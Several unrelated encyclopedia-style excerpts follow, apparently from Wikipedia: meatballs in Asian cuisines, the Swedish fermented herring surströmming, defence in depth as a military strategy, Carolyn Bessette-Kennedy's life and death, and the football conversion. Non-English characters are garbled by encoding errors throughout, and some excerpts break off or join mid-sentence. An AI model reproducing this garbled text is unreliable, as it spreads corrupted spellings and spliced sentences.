meatballs made from minced meat and flour, sometimes with the addition of lotus root or water chestnut for texture, are deep-fried and served in a vinegar-based sweet and sour sauce, or in a light broth with chopped coriander. Indonesian bakso noodle soup *Indonesian meatballs are called bakso which are usually served in a bowl, served in broth soup, with noodles, rice vermicelli, bean curd (tofu), hard-boiled egg, siomay/ steamed meat dumpling, and fried wonton. They have a consistent homogeneous texture. Bakso can be found in major Indonesian cities and towns, however, the most popular are bakso Solo and bakso Malang (named after the city of origin). In Malang, bakso bakar (roasted bakso) is also popular. As most Indonesians are Muslim, generally it is made from beef or sometimes chicken. *In Japanese cuisine, a popular variant of meatballs is tsukune, minced chicken meatballs on a skewer. The Japanese hamburger steak, hanbƒÅgu, is typically made of ground beef, milk- soaked panko (bread crumbs) and minced, sauteed onions. They are typically eaten with a sauce made from ketchup and Worcestershire sauce. Chinese-style meatballs are also popular. Another kind of meatball called Tsumire is made from ground fish. This is often added to soups or Nabes (stews). *In the Philippines, meatballs are called bola-bola or almondigas and are usually served in a misua noodle soup with toasted garlic, squash and pork cracklings. Bola-bola are derived from Hispanic influence on Filipino cuisine and ultimately derived from Moorish influence. Bola-bola are also stewed or pan- fried until golden brown. Bola-bola is also used as a filling for siopao, the local variant of baozi. *In Thailand, meatballs (luk chin) are various. The materials can be pork, beef, chicken and fish. The finished meatballs can be incorporated into many dishes. They can be grilled, deep fried, eaten with dipping sauce, or can be used as the component of noodle soups. *In Vietnam, meatballs (th·ªãt vi√™n or m·ªçc, b√≤ vi√™n, c√° vi√™n) can be used as an ingredient in ph·ªü and h·ªß ti·∫øu.

The Baltic herring, known as str√∂mming in Swedish, is smaller than the Atlantic herring, found in the North Sea. Traditionally, the definition of str√∂mming is \\"herring fished in the brackish waters of the Baltic north of the Kalmar Strait\\".They are about one third the size of North Sea herring (Swedish sill) that is adapted to salt water. UNEP (United Nations Environment Programme) The herring used for surstr√∂mming are caught just prior to spawning in April and May. During the production of surstr√∂mming, just enough salt is used to prevent the raw herring from rotting while allowing it to ferment. A fermentation process of at least six months gives the fish its characteristic strong smell and somewhat acidic taste. According to a Japanese study, a newly opened can of surstr√∂mming has one of the most putrid food smells in the world, even stronger than similarly fermented fish dishes such as the Korean hongeohoe or Japanese kusaya.Excerpt from Hakkou ha chikara Nari, Takeo Koizumi, NHK Ningen Kouza 2002 At the end of the 1940s, surstr√∂mming producers in Sweden lobbied for a royal ordinance () that would prevent incompletely fermented fish from being sold. The decree that was issued forbade sales of the current year's production in Sweden prior to the third Thursday in August. While the ordinance is no longer on the books, retailers still maintain the date for the \\"premiere\\" of that year's catch.  Origin  Surstr√∂mming in a traditional preparation: served on flatbread with boiled potatoes and salad Surstr√∂mming has been part of northern Swedish cuisine since at least the 16th century. Fermented fish is an old staple in European cuisines. The oldest archeological findings of fish fermentation are 9,200 years old and from the south of today's Sweden.Signs of early settlement in the Nordic region date back to the cradle of civilization, EurekAlert! 8 Feb 2016 More recent examples include garum, a fermented fish sauce made by the ancient Greeks and Romans, and Worcestershire sauce, which also has a fermented fish ingredient. Preservation of fish through fermentation in a weak brine may have developed when brining was still expensive due to the cost of salt. In modern times, the fish are initially marinated in a strong brine solution that draws out the blood, and then fermented in a weaker brine in barrels prior to canning. The canning procedure, introduced in the 19th century, enabled the product to be marketed in shops and stored at home, whereas at one time the final stage would have been storage in large wooden barrels and smaller, one-litre kegs. Canning also enabled the product to be marketed farther south in Sweden.  Chemical process  The fermentation happens through autolysis and starts from a lactic acid enzyme in the spine of the fish. Together with bacteria, pungent smelling acids are formed, such as propionic acid, butyric acid and acetic acid. Hydrogen sulfide is also produced. The salt raises the osmotic pressure of the brine above the zone where bacteria responsible for rotting can thrive and prevents decomposition of proteins into oligopeptides and amino acids. Instead, the osmotic conditions enable Halanaerobium bacteria to thrive and decompose the fish glycogen into organic acids, making it sour (acidic).  Production  The herring are caught in April and May, when they are in prime condition and just about to spawn, and have not yet fattened. They are put into a strong brine for about 20 hours which draws out the blood, after which the heads are removed and the fish is gutted and put into a weaker brine solution. The barrels are placed in a temperature controlled room kept at . Canning takes place at the beginning of July and for five weeks thereafter. Ten days prior to the premiere the final product is distributed to wholesalers. The fermentation of the fish depends on a lactic acid enzyme in the spine that is activated if the conditions are right (temperature and brine concentration). The low temperature in Northern Sweden is one of the parameters that affects the character of the final product. Prior to modern canning methods, surstr√∂mming was sold in wooden barrels for immediate consumption, as even the smaller one-litre kegs could leak. Fermentation continues in the can, causing it to bulge noticeably, which would usually be a sign of botulism or other food poisoning concern in non-fermented canned foods. Species of Halanaerobium bacteria are responsible for the in-can ripening. These bacteria produce carbon dioxide and a number of compounds that account for the unique odour: pungent (propionic acid), rotten-egg (hydrogen sulfide), rancid-butter (butyric acid), and vinegary (acetic acid). Due to these gases, a thousand cans of surstr√∂mming exploded over a period of six hours during a fire at a Swedish warehouse in 2014. Surstr√∂mming is commonly sold in grocery stores all over Sweden.  Preparation  Surstr√∂mming with potatoes and onion on buttered tunnbr√∂d, served with cold milk Swedes usually consume surstr√∂mming after the third Thursday of August, labeled as \\"Surstr√∂mming day\\", through early September. Because of the strong smell, it is often eaten outdoors. The pressurized can is usually opened some distance away from the dining table and is often initially punctured while immersed in a bucket of water, or after tapping and angling it upwards at 45 degrees, to prevent the escaping gas from spraying any brine. Surstr√∂mming comes both ungutted with just the heads removed and as fillets. Regarding the first version, the fish is gutted prior to eating, and the backbone and sometimes the skin are removed. Roe from str√∂mming is commonly eaten along with the fish. Surstr√∂mming is often eaten with tunnbr√∂d, a thin, either soft or crispy bread (not to be confused with crispbread). The use of tunnbr√∂d originated in the High Coast area, where the tradition is to make a sandwich (known as a surstr√∂mmingskl√§mma) using two pieces of buttered hard tunnbr√∂d. In addition to the fish, the two most common toppings are potatoes (either sliced or mashed, often almond potatoes) and finely diced red onion. Surstr√∂mming is also commonly eaten without bread together with the accompanying ingredients. To balance the strong flavour of the fish, V√§sterbotten cheese is sometimes added. In the southern part of Sweden, it is customary to use a variety of condiments such as diced red onion, gr√§ddfil (fat fermented sour cream similar to smetana) or cr√®me fra√Æche, chives, and sometimes even tomato and chopped dill. Surstr√∂mming is commonly served with snaps, light beers like pilsner or lager, svagdricka (a type of small beer), water, or cold milk. What to drink with surstr√∂mming is disputed among connoisseurs. Surstr√∂mming is usually served as the focus of a traditional festivity called a surstr√∂mmingsskiva. Some people do not care for surstr√∂mming. It is a food which is subject to strong passions, as is lutefisk.  International opinion  German food critic and author Wolfgang Fassbender wrote that \\"the biggest challenge when eating surstr√∂mming is to vomit only after the first bite, as opposed to before\\". = European Union = Due to being made from herring from the Baltic sea, surstr√∂mming today contains higher levels of dioxins and PCBs than permitted in the EU. Sweden was granted exceptions to these rules from 2002 to 2011, and a renewal of the exceptions was then applied for. Producers have said that if the application is denied they will only be allowed to use herring less than long, which contain lower levels, and which will affect the availability of herring. = Surstr√∂mming challenge = Since gaining notoriety as one of the world's smelliest foods, surstr√∂mming has become the focus of a number of \\"challenge\\" videos on YouTube and other platforms where people uninitiated to the food show themselves opening a can for the first time, usually to visceral reaction, and then try to eat the fish without any additional preparation. Often the videos show the participants gagging, swearing, holding their nose, or throwing up. The videos have been criticized by those familiar with eating surstr√∂mming for not following the normal preparation methods, which include opening the can outdoors and/or underwater, gutting the fish and removing the backbone, and serving with tunnbr√∂d and other accoutrements, along with a proper drink. = German eviction = In 1981, a German landlord evicted a tenant without notice after the tenant spread surstr√∂mming brine in the apartment building's stairwell. When the landlord was taken to court, the court ruled that the termination was justified when the landlord's party demonstrated their case by opening a can inside the courtroom. The court concluded that it \\"had convinced itself that the disgusting smell of the fish brine far exceeded the degree that fellow- tenants in the building could be expected to tolerate\\". = Airline bans = In April 2006, several major airlines (such as Air France, British Airways, Finnair, and KLM) banned the fish, claiming that the pressurised cans of fish are potentially explosive. The sale of the fish was subsequently discontinued in Stockholm's international airport. Those who produce the fish have called the airlines' decision \\"culturally illiterate\\", claiming that it is a \\"myth that the tinned fish can explode\\". =Protests in Hong Kong= During March 2018 Hong Kong by-elections, the returning officer Amy Chan Yuen-man had disqualified two localist candidates Ventus Lau and James Chan Kwok-keung. Lau visited the Home Affairs Department of Sha Tin District Office in person asking for a meeting with Chan. Lau had brought a can of surstr√∂mming and opened it in public. Lau said that he would like Chan to sense that the Hong Kong people are facing an entirely rotten election system. Lau launched an appeal to the court, while the court announced that Chan's decisions were not justified.  Museum  On 4 June 2005, the first surstr√∂mming museum in the world was opened in Skeppsmalen, south-east of √ñrnsk√∂ldsvik, a town at the northern end of the High Coast. The name of the museum is \\"Fiskevistet\\" (translated to The Fish Encampment).

Rather than defeating an attacker with a single, strong defensive line, defence in depth relies on the tendency of an attack to lose momentum over time or as it covers a larger area. A defender can thus yield lightly defended territory in an effort to stress an attacker's logistics or spread out a numerically superior attacking force. Once an attacker has lost momentum or is forced to spread out to pacify a large area, defensive counter-attacks can be mounted on the attacker's weak points, with the goal being to cause attrition or drive the attacker back to its original starting position. Strategy A conventional defence strategy would concentrate all military resources at a front line, which, if breached by an attacker, would leave the remaining defenders in danger of being outflanked and surrounded and would leave supply lines, communications, and command vulnerable. Defence in depth requires that a defender deploy their resources, such as fortifications, field works and military units at and well behind the front line. Although attackers may find it easier to breach the more weakly defended front line, as they advance, they continue to meet resistance. As they penetrate deeper, their flanks become vulnerable, and, should the advance stall, they risk being enveloped. The defence in depth strategy is particularly effective against attackers able to concentrate their forces and attack a small number of places on an extended defensive line. Defenders that can fall back to a succession of prepared positions can extract a high price from the advancing enemy while themselves avoiding the danger of being overrun or outflanked. Delaying the enemy advance mitigates the attacker's advantage of surprise and allows time to move defending units to make a defence and to prepare a counter-attack. A well- planned defence in depth strategy will deploy forces in mutually supportive positions and in appropriate roles. For example, poorly trained troops may be deployed in static defences at the front line, whereas better trained and equipped troops form a mobile reserve. Successive layers of defence may use different technologies against various targets; for example, dragon's teeth might present a challenge for tanks but is easily circumvented by infantry, while another barrier of wire entanglements has the opposite effects on the respective forces. Defence in depth may allow a defender to maximise the defensive possibilities of natural terrain and other advantages. The disadvantages of defence in depth are that it may be unacceptable for a defender to plan to give ground to an attacker. This may be because vital military or economic resources are close to the front line or because yielding to an enemy is unacceptable for political or cultural reasons. In addition, the continuous retreats that are required by defence in depth require the defender to have a high degree of mobility in order to retreat successfully, and they assume that the defender's morale will recover from the retreat. Examples A possible early example of this came at the Battle of Cannae in 216 BC, when Hannibal employed this manoeuvre in order to encircle and destroy eight Roman legions, but that is disputed by some historians.Healy, Mark. Cannae: Hannibal Smashes Rome's Army. Sterling Heights, Missouri: Osprey Publishing, 1994. Edward Luttwak used the term to describe his theory of the defensive strategy employed by the Late Roman army in the 3rd and 4th centuries AD. Later examples of defence in depth might be European hill forts and the development of concentric castles. In those examples, the inner layers of defence can support the outer layers with projectile fire and an attacker must breach each line of defence in turn with the prospect of significant losses, and the defenders have the option of falling back to fight again. On a strategic level, defence in depth was employed by the Byzantine military. In the American Revolutionary War's Battle of Cowpens, the American forces were positioned in three lines which soaked up the shock of the British charge and inflicted heavy casualties before the Americans were able to overrun the British who, at this point, had lost their cohesion. More recent examples of defence in depth include the multiple lines of trenches of the First World War and the following Turkish War of Independence where the Turks stopped the advance of the Greeks towards Ankara. Also plans for the defence of Britain against a potential German invasion in the Second World War. During the Battle of Normandy, Wehrmacht forces utilized the bocage of the area, flooding of fields, and strategic placement of defences to create successive lines of defences to slow the attacking Allies in hopes that reinforcements would arrive. The Pacific Theatre also had many examples of defence in depth, with the Japanese inflicting heavy casualties on the Americans in the Battles of Tarawa, Saipan, Peleliu, Iwo Jima, and Okinawa. The best modern example of a successful defence in depth is that of the Battle of Kursk. During the battle, the Red Army deliberately drew the Germans into an attritional battle in multiple, well-prepared defensive lines, before launching massive counter- attacks on either side of the 9th Army in the north and the 4th Panzer Army in the south. The initial German offensive never fully penetrated the Red Army lines. By contrast, the subsequent Red Army counter-offensive pushed the front line hundreds of miles westwards. Colonel Francis J. Kelly discussed the employment of defence in depth in Army Special Forces camps during the Vietnam War. Kelly, a former U.S. Army Special Forces commander and author of Vietnam Studies U.S. Army Special Forces 1961‚Äì1971, stated in his work that the austere Special Forces fighting camps were highly functional and easily defended. While untested, this was also the planned NATO strategy in Europe during the Cold War at the Fulda Gap.

Kennedy Jr. After her marriage, Bessette-Kennedy's relationship with her husband and her fashion sense became the subjects of media scrutiny, drawing comparisons to her mother-in-law Jacqueline Kennedy Onassis. The couple and Bessette-Kennedy's older sister, Lauren, died in a plane crash off the coast of Martha's Vineyard in July 1999. Early life and education Bessette was born in White Plains, New York, in 1966. She was the youngest child of William J. Bessette, a cabinet maker, and Ann Messina, an administrator in the New York City public school system. She had two older sisters, twins Lauren and Lisa. Bessette's parents divorced when she was very young. Her mother later remarried Richard Freeman, an orthopedic surgeon, and moved to Old Greenwich, Connecticut, while Bessette's father stayed in White Plains. Bessette attended Juniper Hill Elementary School, where art teacher Linda Bemis recalled her as a shy but ordinary child. At Juniper Hill, Bessette's mother was a substitute teacher. Raised in a Roman Catholic household, Bessette later attended St. Mary's High School.Waldman, 1999 At St. Mary's, Bessette was voted by her classmates the \\"Ultimate Beautiful Person.\\" During her high school experience, Bessette was described as being part of the \\"in crowd\\" and having attended \\"all the right parties\\". She had initially started high school at Greenwich High School, but her parents transferred her to St. Mary's because they felt she was not taking her studies seriously. After graduating from high school in 1983, Bessette attended Boston University's School of Education, graduating in 1988 with a degree in elementary education. While there, she dated John Cullen, star of the school's ice hockey team, who would later play professional hockey in the NHL. Bessette briefly attempted a modelling career, and hired a professional photographer to take pictures for her portfolio. Although her modelling career did not prove to be profitable, she did appear on the cover of Boston University's calendar, \\"The Girls of B.U.\\" Career After college and until her marriage to Kennedy, Bessette worked for Calvin Klein Ltd., a high-end American fashion house. During her successful career there, she went from being a saleswoman at the Chestnut Hill Mall in the town of Newton, Massachusetts to becoming the director of publicity for the company's flagship store in Manhattan. While working for Klein in Boston, Bessette was noticed by Susan Sokol, a travelling sales coordinator for the company. Sokol, impressed with Bessette's grace and style, later recommended her for a position dealing with Klein's high-profile clients, such as actress Annette Bening and newscaster Diane Sawyer. By the time she left Calvin Klein, she was the Director of Show Productions earning a salary in the low six figures. Bessette first met Kennedy in 1992, while he was dating actress Daryl Hannah. Bessette and Kennedy began dating in 1994 and became a popular paparazzi target, and gossip columns detailed where they ate and shopped, and even covered their arguments. Paparazzi often waited outside the couple's Tribeca apartment to snap photographs. Bessette was introduced to John's uncle, Senator Ted Kennedy, in the late summer of 1994. Following the marriage, the senator would tell the press: \\"You could tell right away that there was something special between the two of them.\\"Heymann 2008, p. 416. Bessette moved into Kennedy's Tribeca loft in the summer of 1995, and the couple became engaged later that year. She quit her job at Calvin Klein in the spring of 1996. Wedding Kennedy and Bessette succeeded in keeping their September 21, 1996, wedding a secret from the press, avoiding media onlookers.http://web.b.ebscohost.com/ehost/detail/detail?vid=1&sid;=c416235c-1e96-4478-9cea-4a1e7cf5d481%40sessionmgr111&hid;=118&bdata;=JnNpdGU9ZWhvc3QtbGl2ZQ%3d%3d#db=a9h&AN;=9609308008 The ceremony took place by candlelight on the remote Georgia island of Cumberland, in a tiny wooden chapel, the First African Baptist Church. The bride selected the then-little-known designer Narciso Rodriguez of Cerruti for her wedding dress of pearl-white crepe. The groom's older sister, Caroline Kennedy, was matron of honor, and Anthony Radziwill, the son of his aunt Lee Radziwill-Ross, served as Kennedy's best man. Caroline's two daughters, Tatiana and Rose, were flower girls, and her son Jack was the ring bearer. The couple honeymooned in Turkey. Married life Carolyn and John Kennedy at the White House Correspondents' Dinner, 1997 After the wedding, the media attention surrounding the couple intensified, and Bessette-Kennedy often found it difficult to deal with the harassment. When the couple returned from their honeymoon, a mass of reporters was waiting on their doorstep. John said, \\"Getting married is a big adjustment for us, and for a private citizen like Carolyn even more so. I ask you to give her all the privacy and room you can.\\"Heymann, p. 463. Bessette-Kennedy was badly disoriented by the constant attention from the paparazzi. The couple was permanently on show, both at fashionable Manhattan events and on their travels to visit celebrities such as Mariuccia Mandelli and Gianni Versace.Heymann, p. 447. Bessette-Kennedy told her friend, Carole Radziwill, that the only way to avoid the paparazzi was to leave her apartment at 7 in the morning. She also complained to her friend, journalist Jonathan Soroff, that she could not get a job without being accused of exploiting her fame.Heymann, pp. 472-473. Her minimalist \\"throwaway chic\\" fashion sense was chronicled by various fashion publications and drew repeated comparisons to her mother-in-law, former First Lady Jacqueline Kennedy Onassis. While the interest surrounding the couple continued, Bessette-Kennedy refused to give interviews and turned down offers to appear in fashion magazines. Towards the end of her life, Bessette-Kennedy became more involved with charity work and often accompanied her husband to dinners at the White House (the couple were given a tour by President Bill Clinton in March 1998) and acted as the hostess for parties for her husband's political magazine George. According to some reports published after their deaths, the Kennedys were experiencing marital problems and contemplating divorce in the months preceding their deaths. The couple had various disagreements, including her refusal to start a family, John‚Äôs work on the George magazine where she felt forsaken, and her dislike of John‚Äôs publishing partner Michael Berman. According to Vanity Fair, Bessette-Kennedy's \\"insecurity fueled a need to control and manipulate; her frequent use of cocaine made her paranoid\\". Moreover, Bessette-Kennedy was jealous of and barely on speaking terms with her sister-in-law Caroline Kennedy, who reportedly criticized the bride for being late to her own wedding and wearing heels on the beach. However, close friends reject the divorce claims. Robert Littell, who spent the weekend with John and Carolyn a week before their deaths, also reject the allegation that the couple were living apart at the time of their deaths. In his book, The Kennedy Curse: Why Tragedy Has Haunted America's First Family for 150 Years, author Edward Klein claimed that the couple's problems reportedly stemmed from Bessette-Kennedy's difficulty dealing with the media attention surrounding her and the marriage, accusations of infidelity, disagreements about having children, and Bessette-Kennedy's alleged cocaine use. Although Klein is the author of several Kennedy books, John Kennedy Jr. said, when speaking of Klein, \\"he is a guy who had lunch with my mother twenty years ago and has been dining out on it ever since.\\" Friends of the couple's, including John Perry Barlow and Christiane Amanpour, said that Bessette-Kennedy and Kennedy fought on occasion and that Bessette-Kennedy had trouble adjusting to the intense media coverage, but denied that she used drugs or that the couple was planning to divorce. The couple began seeing a marriage counselor in March 1999 and sought counseling from Cardinal John O'Connor in the summer of 1999.Heymann 2008, p. 487. In the summer of June 2019, a video of the secret wedding that took place in the remote Georgian Island was released for public viewing.  Plane crash and death  Bessette-Kennedy died on July 16, 1999, along with her older sister Lauren and husband, when the light plane he was piloting crashed into the Atlantic Ocean off the western coast of Martha's Vineyard. The National Transportation Safety Board (NTSB) determined that the probable cause of the crash was: \\"The pilot's failure to maintain control of the airplane during a descent over water at night, which was a result of spatial disorientation. Factors in the accident were haze and the dark night.\\" After a five-day search, the wreckage was discovered in the late afternoon of July 21. The bodies were recovered from the ocean floor by Navy divers and taken by motorcade to the county medical examiner's office, where autopsies revealed that the crash victims had died upon impact. At the same time, the Kennedy and Bessette families announced their plans for memorial services. Toxicology testing was conducted on the pilot and passengers. All tested negative for alcohol and drugs.FAA Toxicology Accident Research Laboratory In the late hours of July 21, the three bodies were taken from Hyannis to Duxbury, where they were cremated in the Mayflower Cemetery crematorium. On the morning of July 22, their ashes were scattered from the Navy ship off the coast of Martha's Vineyard. In popular culture Before marrying Kennedy, Bessette was in a relationship with Calvin Klein model Michael Bergin, who wrote a memoir titled The Other Man: John F.

Littell published, The Men We Became: My Friendship With John F. Kennedy Jr. In 2005, Bessette-Kennedy's close friend Carole Radziwill, wife of John's cousin Anthony Stanislas Radziwill, published a memoir entitled What Remains: A Memoir of Fate, Friendship and Love, that includes her memories of the plane crash that took place just weeks before her own husband's death from cancer. In 2012, Kennedy's assistant and publicist, RoseMarie Terenzio, published her experiences and behind-the-scenes observations based on her five years working with Kennedy and, eventually, her friendship with him and his wife in Fairy Tale Interrupted: A Memoir of Life, Love, and Loss. Rosamund Pike was encouraged by Gone Girl director David Fincher to base her character, Amy Dunne, on Bessette-Kennedy. Fincher said of Bessette-Kennedy, \\"She crafted herself, she re-invented herself, and invented that persona. That's where I began.\\" Pike searched unsuccessfully for audio of her, though she would concede her character should be created from the \\"outside in.\\" In 2015, Wes Gordon, known for disliking discussion about the influences of his collections, admitted Bessette-Kennedy's impact on the clothing for women in that year's collection. Gordon was long interested in Bessette-Kennedy's style prior to production.

The conversion, try (American football, also known as a point(s) after touchdown, PAT, or extra point), or convert (Canadian football) occurs immediately after a touchdown during which the scoring team is allowed to attempt to score one extra point by kicking the ball through the uprights in the manner of a field goal, or two points by bringing the ball into the end zone in the manner of a touchdown. Attempts at a try or convert are scrimmage plays, with the ball initially placed at any point between the hash marks, at the option of the team making the attempt. The yard line that attempts are made from depends on the league and the type of try or convert being attempted. If the try or convert is scored by kicking the ball through the uprights, the team gets an additional one point for their touchdown, bringing their total for that score from six points to seven. If two points are needed or desired, a two-point conversion may be attempted by running or passing from scrimmage. A successful touchdown conversion from scrimmage brings the score's total to eight. Whether a team goes for one or two points, most rules regarding scrimmage downs, including scoring touchdowns and field goals, apply as if it were a normal American fourth-down or Canadian third-down play. Exceptions, including cases where the defense forces a turnover during a conversion attempt, vary between leagues and levels of play. One thing that sets the try apart from other plays in the NFL is that, apart from the actual points, ordinary statistics are not recorded on the try as they would be on a regular scrimmage play. For example, on December 4, 2016, Eric Berry of the Kansas City Chiefs made an interception on a try and physically returned it 99 yards for a defensive two-point conversion. However, because it occurred on a try, Berry did not get statistical credit for the 99 yards of return yardage; nor would a player ever be credited with passing, rushing, or receiving yardage on a try. History \\"A goal from touchdown.\\" The try/convert is among the oldest parts of the game of gridiron football and dates to its rugby roots. In its earliest days, scoring a touchdown was not the primary objective but a means of getting a free kick at the goal (hence why the name \\"try\\", more commonly associated with rugby today, is still used in American football rule books), and thus early scoring rubrics for the game gave more points to the subsequent kick than the actual advancement of the ball over the goal line. The related term \\"conversion\\" is still used in both rugby union and rugby league to refer to extra points scored by kicking the ball through the posts after a try has been scored. By the start of the 20th century, touchdowns had become more important and the roles of touchdown and kick were reversed. By this time the point value for the after-touchdown kick had reduced to its current one-point value while the touchdown was now worth five. (This later increased to six points in American football in 1912 and in Canadian football in 1956.) In the first half of the 20th century, a one-point conversion could be scored either by kick or by way of a scrimmage play. Beginning in 1958, the scrimmage play conversion method of scoring became worth two points (a two-point conversion) in college football. While the American Football League adopted the college rule throughout its ten-season existence in the 1960s (as did the United States Football League throughout its three-season existence in the 1980s), other professional leagues were slow to follow suit; all levels of Canadian football did so in 1975, and the National Football League did not do so until 1994. Although a successful kick is only worth one point, and has a very high rate of success, missed or blocked attempts can decide the outcome of the game: *One example was the 2003 game between the New Orleans Saints and Jacksonville Jaguars where, after the Saints scored a touchdown in the multiple-lateral River City Relay as time expired, their kicker John Carney missed the extra point, giving the Jaguars a 20‚Äì19 victory. *On October 21, 2018, with 24 seconds remaining on the clock, Baltimore Ravens kicker Justin Tucker had his first-ever missed PAT attempt, ending the game and causing the Baltimore Ravens to lose to the New Orleans Saints 24‚Äì23. This was his first missed kick out of 223 attempts. Even so, he is still the most accurate kicker in NFL history with 241 out of 242 successful attempts. *On November 11, 1979, the New York Jets lost to the Buffalo Bills 14‚Äì12, the difference coming from two missed extra points by place kicker Toni Linhart. Linhart, who had been cut earlier in the 1979 season by the Baltimore Colts and was signed by the Jets to fill in for the injured Pat Leahy, never played another game in the NFL. Central Michigan lines up for a PAT. *Another 2003 game, this one between the Carolina Panthers and Tampa Bay Buccaneers, was sent to overtime after what would have been a game-winning extra point was blocked. The Panthers won the game in overtime 12‚Äì9. *A 2005 game between the Green Bay Packers and Tampa Bay Buccaneers is another example, as the Buccaneers won 17‚Äì16, the difference being Ryan Longwell missing an extra point after a Packers touchdown. *In the 2016 AFC Championship Game, New England Patriots placekicker Stephen Gostkowski missed an extra point in the first quarter, keeping the score at 7‚Äì6 in favor of the Denver Broncos. The Patriots were forced to go for two when they scored a touchdown late in the fourth quarter. The two-point try was intercepted, putting the Broncos in Super Bowl 50 with a 20‚Äì18 victory. The CFL and NFL both made major changes to the rules governing conversions prior to their respective 2015 seasons, reducing or eliminating some of the differences between the two leagues. Duration of the play In American high school football (in most states), the play is over once the ball becomes dead or the defense takes possession. In many other levels of football, including the CFL, NFL, and American college football, the play continues after a turnover to the defense. This allows the defense to return the ball to the opponent's end zone for two points and also allows for a one-point safety. Two states, Texas and Massachusetts, play high school football under NCAA rules and thus allow the defense to score on an extra-point attempt. Differences between leagues In American high school and college football, the line of scrimmage is the three-yard line (a small hashmark is denoted on the field of this in the middle of the 3-yard line). In American football, the game clock does not run during an extra-point attempt, except for some rare circumstances at the high-school level (some state associations allow for the clock to run continuously in the second half if one team is leading the other by a large margin)Forums.nfhs.org and for arena football, which runs the clock continuously except during the final minute of each half and overtime. In Canadian football, the clock runs during a conversion attempt except during the last three minutes of each half. The use of small, rubberized \\"tees\\" for convert attempts (not the same as the kickoff tee, but rather a small plastic block; such tees come in heights of ) varies depending on the level of play. Unlike in the lower ranks of play up to the high school level, the NFL (and most other professional leagues) has never allowed the use of \\"tees\\" for extra point kick attempts, having always required kickers to kick off the ground for such attempts (and for field goals); In 1948, the NCAA authorized the use of the small rubberized kicking tee for extra points and field goals, but banned them by 1989, requiring kicks from the ground, like in the NFL. The Canadian Football League, despite its status as a professional league, does allow for the use of such a tee for converts and field goals, but it is optional, as kickers can also kick off the ground if they so desire. =Pre-2015= Prior to the 2015 season, the NFL used the 2-yard line (with the kick coming at the 10-yard line for a 20-yard attempt) for all conversion (P.A.T.) attempts (which was denoted on the field with a hashmark in the middle of the 2-yard line; although the line of scrimmage on the point after kick attempt was moved back in 2015, it remains to denote the two-point conversion's line of scrimmage). In Canadian football, the line of scrimmage was from the five-yard line (for a 12-yard attempt; unlike American football, no hashmark is used to denote the convert's line of scrimmage on the field in Canada). San Francisco 49ers kicker Joe Nedney prepares to kick an extra point with punter Andy Lee as the holder, 2008 In the NFL, the conversion was required after a touchdown scored during the regulation game (i.e., not overtime), because point differential is used for some tiebreakers in the standings. Rarely, this can result in such an attempt having to be made at the end of the game when it cannot change the outcome of the game; two of the best-known examples of this occurred after the winning touchdown by the Philadelphia Eagles in the December 19, 2010, game known as the Miracle at the New Meadowlands and after the controversial game-winning touchdown by the Seattle Seahawks on September 24, 2012. If the game is in sudden death overtime, the extra-point attempt is omitted if the winning score is a touchdown. In American high school and college football, it is likewise omitted following a touchdown on the game's final play if a successful conversion attempt cannot change the outcome of the game. There is, however, one exception in college football because the defense can also score two points on a return of a conversion try (and theoretically score a one-point safety) and the NCAA rules state that the conversion try must be run if any subsequent scoring on the play could impact the outcome of the game. Therefore, if a team scores a touchdown to take the lead by one or two points as time expires, they must still attempt the conversion, although most teams will simply opt to take a knee to prevent the risk of the defense scoring. For example, on October 24, 2009, Iowa scored as time expired to take a 15‚Äì13 lead over Michigan State. Making the conversion would have made no difference in Iowa winning the game, but Iowa still had to attempt it, so Ricky Stanzi simply knelt down, as a return by Michigan State would have tied the game and forced overtime. In Canadian football, the scoring team is entitled to a conversion play after scoring with no time on the clock, but may choose to waive it if they feel it is not needed. Because head-to-head points scored is used as a tiebreaker in the standings between teams, they often choose to take it if it is against a division opponent with whom a tie in the standings is possible. As in U.S. college football, Canadian football allows defenses to score two points for the successful return of a convert attempt. =2015‚Äìpresent= The CFL and NFL both implemented major changes to how conversions were attempted starting with their respective 2015 seasons. In the CFL, the line of scrimmage for a kick attempt moved back 20 yards to the 25-yard line (for a 32-yard attempt), while the line of scrimmage for a two- point attempt moved forward two yards to the three-yard line. In the NFL, the line of scrimmage for a kick attempt moved back 13 yards to the 15-yard line (for a 33-yard attempt), effectively placing the ball the same distance from the goalposts as in the CFL. The line of scrimmage for a two-point attempt remained at the two-yard line. NFL defenses also became able to run back failed conversion attempts for a two-point score. On December 6, 2015, New Orleans Saints linebacker Stephone Anthony became the first player in NFL history to do so, after New Orleans blocked an extra-point kick by the Carolina Panthers. Some broadcasters did not immediately update their in-game graphics programming to account for the scoring of two points for the defensive return of a try, resulting in the score sometimes being erroneously displayed to audiences as a \\"safety\\" (which has the same scoring value). As expected, the 2015 rule changes increased the frequency of two-point conversion attempts, from a rate of about five percent to about eight percent, much of that increase coming from the Pittsburgh Steelers alone. Starting with the 2018 season, the NFL adopted the CFL rule allowing teams to waive \\"unnecessary\\" extra point attempts at the end of the game. =Special overtime rules= In most cases in gridiron football, one point may be scored following a touchdown‚Äîbringing the total value of the touchdown to seven points‚Äîby place kicking the ball through the uprights. Exceptions occur in overtime in some leagues. In American college football, if the game reaches the third or subsequent period of overtime, no further one-point kicks are allowed‚Äîonly two-point conversions. In the CFL, one-point (kicking) converts are not available in overtime; all convert attempts must be for two-point (rushing or passing) converts. In the NFL, an overtime game automatically ends on a touchdown even on the first possession, so there is never a situation in overtime where a try would be possible. Other leagues In 1968, the AFL and NFL eliminated the extra-point kick for interleague preseason games, allowing only one-point scrimmage plays called \\"Pressure Points\\"; this was scrapped when both leagues began their regular seasons that year. The World Football League (which called their conversions \\"Action Points\\"), Alliance of American Football, and both the 2001 and 2020 incarnations of the XFL did the same in their short lives. The XFL later implemented a variable system that allowed increasing point values for increasing the distance to the end zone on the attempt for its 2001 playoffs, which is carrying over into the 2020 league; that system was later adopted by the Stars Football LeagueBerardino, Mike (July 21, 2011). Tiger Woods, Steve Williams and the four-point field goal (Three Things). South Florida Sun-Sentinel. Retrieved July 25, 2011. and, in a reduced form, the Legends Football League. The CFL proposed to test the variable-distance scoring system during the 2015 preseason, but the proposal was rejected. In arena football, two points can also be scored by means of a drop-kicked field goal. Some youth football leagues turn the scoring upside- down to an extent, scoring one point for a running touchdown and two points for either a passing touchdown or field goal; six-man football follows a similar convention that rewards one point for a pass or run and two points for a kick.

